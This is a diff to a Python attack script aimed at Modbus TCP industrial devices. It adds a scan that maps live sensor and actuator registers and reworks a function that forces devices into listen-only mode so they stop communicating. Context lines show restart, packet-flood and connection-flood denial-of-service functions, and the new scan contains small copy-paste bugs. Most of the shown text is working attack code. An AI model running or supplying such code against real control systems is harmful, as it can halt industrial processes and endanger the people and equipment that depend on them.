@@ -162,19 +162,80 @@ def device_identification_attack(ip_addresses):
                 print(f"  {k}: {v}")
 
             print("*** Regular object type data: ***")
-            request = ReadDeviceInformationRequest(read_code=1)
+            request = ReadDeviceInformationRequest(read_code=2)
             response = client.execute(request=request)
             for k, v in response.information.items():
                 print(f"  {k}: {v}")
 
             print("*** Extended object type data: ***")
-            request = ReadDeviceInformationRequest(read_code=1)
+            request = ReadDeviceInformationRequest(read_code=3)
             response = client.execute(request=request)
             for k, v in response.information.items():
                 print(f"  {k}: {v}")
         print()
         client.close()
     print("### DEVICE IDENTIFICATION ATTACK FINISH ###")
+
+
+
+# Function: naive_sensor_read
+# Purpose: Scans over all registers and coils and attempts for find changing values,
+#   which can potentially expose used addresses.
+def naive_sensor_read(ip_addresses):
+    print("### NAIVE SENSOR READ ###")
+
+    for ip in ip_addresses:
+        print(f"===== Performing naive sensor read on {ip} =====")
+        print("Scanning for all registers (coils/di/ir/hr) for 15 seconds")
+        print("Attempting to find sensor values")
+        print("-------------------------------")
+
+        client = ModbusTcpClient(host=ip, port=502)
+
+        prev_coil = client.read_coils(0, 2000).bits
+        prev_di = client.read_discrete_inputs(0, 2000).bits
+        prev_ir = client.read_input_registers(0, 125).registers
+        prev_hr = client.read_holding_registers(0, 125).registers
+
+        coil_found = []
+        di_found = []
+        ir_found = []
+        hr_found = []
+
+        for _ in range(15):
+            sleep(1)
+            coil = client.read_coils(0, 2000).bits
+            di = client.read_discrete_inputs(0, 2000).bits
+            ir = client.read_input_registers(0, 125).registers
+            hr = client.read_holding_registers(0, 125).registers
+
+            # compare previous response to current response
+            for i in range(len(prev_coil)):
+                if coil[i] != prev_coil[i] or coil[i] != 0:
+                    if i not in coil_found:
+                        print(f"Changing coil found at location {i+1} (likely a sensor/actuator value)")
+                    coil_found.append(i)
+            prev_coil = coil
+            for i in range(len(prev_di)):
+                if di[i] != prev_di[i] or di[i] != 0:
+                    if i not in di_found:
+                        print(f"Changing discrete input found at location {i+1} (likely a sensor/actuator value)")
+                    di_found.append(i)
+            prev_di = di
+            for i in range(len(prev_ir)):
+                if ir[i] != prev_ir[i] or ir[i] != 0:
+                    if i not in ir_found:
+                        print(f"Changing holding register found at location {i+1} (likely a sensor/actuator value)")
+                    ir_found.append(i)
+            prev_coil = coil
+            for i in range(len(prev_hr)):
+                if hr[i] != prev_hr[i] or hr[i] != 0:
+                    if i not in hr_found:
+                        print(f"Changing holding register found at location {i+1} (likely a sensor/actuator value)")
+                    hr_found.append(i)
+        print("-------------------------------")
+        client.close()
+    print("### NAIVE SENSOR READ FINISH ###")
 
 
 
@@ -187,18 +248,22 @@ def force_listen_mode(ip_addresses):
 
     for ip in ip_addresses:
         print(f"Forcing device {ip} into Force Listen Only Mode")
-        client = ModbusClient(host=ip, port=502)
+        client = ModbusTcpClient(host=ip, port=502)
 
         # send custom pdu request for a Force Listen Only Mode request) - function code 08 with subfunction code 04
-        pdu = b'\x08\x00\x04\x00\x00'
-        response = client.custom_request(pdu)
+        CustomFunctionCode = create_custom_request(8)
+        request = CustomFunctionCode(custom_data=b'\x00\x04\x00\x00')
 
-        # check if exception occurred
-        if response == None:
-            print(f"Unsuccessful attack: {client.last_except} - {client.last_except_as_full_txt}")
-        else:
-            print(f"Successful attack!")
-        client.close()
+        try:
+            response = client.execute(request)
+            if isinstance(response, ExceptionResponse):
+                # check if an illegal function exception (0x01) has occurred
+                if response.exception_code != 1:
+                    print(f"Function code 08 accepted with exception {response.exception_code}")
+            else:
+                print(f"Function Code 08 accepted")
+        except Exception as e:
+            print(f"Function Code 08 accepted with an error")
 
     print("### FORCE LISTEN MODE FINISH ###")
 
@@ -206,7 +271,7 @@ def force_listen_mode(ip_addresses):
 
 # Function: restart_communication
 # Purpose: Sends function code 0x08 with sub-function code 0x0001
-#   to restart the device. Does this to cause the device to be constantly
+#   to restart the device. Do this to cause the device to be constantly
 #   inactive.
 def restart_communication(ip_addresses):
     global stop_looping
@@ -235,6 +300,8 @@ def restart_communication(ip_addresses):
         client.close()
             
     print("### RESTART COMMUNICATION FINISH ###")
+
+
 
 # Function: data_flood_attack
 # Purpose: Floods packets of random read requests to the devices
@@ -279,6 +346,8 @@ def data_flood_attack(ip_addresses):
             pass # block
 
     print("### DATA FLOOD ATTACK FINISH ###")
+
+
 
 # Function: connection_flood_attack
 # Purpose: Floods packets with TCP connection requests
